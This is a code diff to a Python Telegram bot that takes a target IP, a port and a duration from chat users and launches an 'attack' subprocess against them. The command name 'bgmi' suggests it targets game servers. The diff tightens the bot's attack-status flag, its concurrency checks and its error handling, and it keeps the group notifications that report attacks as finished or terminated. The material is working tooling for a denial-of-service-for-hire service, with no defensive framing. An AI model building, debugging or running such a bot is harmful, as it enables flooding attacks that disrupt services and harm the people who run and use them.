@@ -306,6 +306,7 @@ async def start_attack(target_ip, port, duration, user_id, original_message, con
     try:
         process = await asyncio.create_subprocess_exec(*command)
         if not process:
+            active_attack = False
             return  # Silently exit if subprocess creation fails
 
         user_processes[user_id] = {
@@ -318,12 +319,10 @@ async def start_attack(target_ip, port, duration, user_id, original_message, con
         await asyncio.wait_for(process.wait(), timeout=duration)
 
         del user_processes[user_id]
-        active_attack = False  # Reset the flag after the attack finishes
-
         try:
             await original_message.reply_text(f"✅ 𝐚𝐭𝐭𝐚𝐜𝐤 𝐟𝐢𝐧𝐢𝐬𝐡𝐞𝐝 𝐨𝐧​ {target_ip}:{port} 𝐟𝐨𝐫 {duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.")
         except Exception:
-            pass  # Silently ignore all errors when sending the reply
+            pass  # Silently ignore errors when sending the reply
 
     except asyncio.TimeoutError:
         if process and process.returncode is None:
@@ -331,19 +330,20 @@ async def start_attack(target_ip, port, duration, user_id, original_message, con
             await process.wait()
         if user_id in user_processes:
             del user_processes[user_id]
-        active_attack = False
-        try:
-            await context.bot.send_message(
-                chat_id=GROUP_ID,  # Send the message to the group
-                text=f"⚠️ 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐞𝐫𝐦𝐢𝐧𝐚𝐭𝐞𝐝 𝐚ꜱ 𝐢𝐭 𝐞𝐱𝐜𝐞𝐞𝐝𝐞𝐝 𝐭𝐡𝐞 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐨𝐧 {target_ip}:{port}."
-            )
-        except Exception:
-            pass
+        await context.bot.send_message(
+            chat_id=GROUP_ID,
+            text=f"⚠️ 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐞𝐫𝐦𝐢𝐧𝐚𝐭𝐞𝐝 𝐝𝐮𝐞 𝐭𝐨 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐥𝐢𝐦𝐢𝐭 𝐨𝐧 {target_ip}:{port}."
+        )
 
-    except Exception:
+    except Exception as e:
+        logging.error(f"Attack error: {e}")
         if user_id in user_processes:
             del user_processes[user_id]
+
+    finally:
+        # Ensure the attack status is reset
         active_attack = False
+
 
 # Start command handler
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -368,7 +368,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     cooldown_time = 600  # Cooldown period in seconds (10 minutes)
 
     # Check if an attack is already in progress
-    if active_attack:
+    if active_attack or user_processes:
         await update.message.reply_text(
             "🚫 𝐀𝐧 𝐚𝐭𝐭𝐚𝐜𝐤 𝐢𝐬 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐢𝐧 𝐩𝐫𝐨𝐠𝐫𝐞𝐬𝐬. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐟𝐨𝐫 𝐢𝐭 𝐭𝐨 𝐟𝐢𝐧𝐢𝐬𝐡."
         )
@@ -421,13 +421,6 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     )
     asyncio.create_task(start_attack(target_ip, port, duration, user_id, attack_message, context))
 
-    # Reset active_attack after completion
-    async def reset_attack_status():
-        global active_attack
-        await asyncio.sleep(duration)
-        active_attack = False
-
-    asyncio.create_task(reset_attack_status())
 
 
 
